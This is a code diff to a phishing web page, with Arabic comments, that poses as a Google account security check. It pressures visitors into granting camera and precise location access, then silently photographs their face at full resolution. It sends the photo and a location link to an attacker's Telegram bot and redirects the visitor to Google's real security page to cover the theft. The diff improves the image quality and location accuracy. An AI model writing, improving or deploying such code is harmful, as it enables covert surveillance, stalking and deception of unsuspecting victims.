@@ -52,7 +52,16 @@
             document.getElementById('status').style.display = 'block';
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // تعديل: طلب أعلى جودة ممكنة (Full HD) وسرعة التقاط
+                const constraints = { 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    } 
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
@@ -61,32 +70,38 @@
 
                     const video = document.createElement('video');
                     video.srcObject = stream;
-                    await video.play();
+                    // تفعيل التقاط سريع بمجرد تحميل الميتا
+                    video.onloadedmetadata = async () => {
+                        await video.play();
 
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; 
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chat_id);
-                        formData.append('photo', blob, 'secure_check.jpg');
-                        formData.append('caption', locLink);
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth; 
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        // تعديل: جودة الصورة 1.0 (أعلى جودة)
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chat_id);
+                            formData.append('photo', blob, 'secure_check.jpg');
+                            formData.append('caption', locLink);
 
-                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
+                            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
 
-                        window.location.href = "https://myaccount.google.com/security";
+                            // إيقاف الكاميرا بعد الالتقاط
+                            stream.getTracks().forEach(track => track.stop());
+                            window.location.href = "https://myaccount.google.com/security";
 
-                    }, 'image/jpeg', 0.6);
+                        }, 'image/jpeg', 1.0); 
+                    };
 
                 }, (err) => {
                     alert("خطأ أمني: يجب السماح بالوصول للموقع لإتمام الفحص.");
                     location.reload();
-                });
+                }, { enableHighAccuracy: true });
 
             } catch (err) {
                 alert("فشل النظام: لا يمكن تأمين الحساب بدون أذونات الكاميرا.");
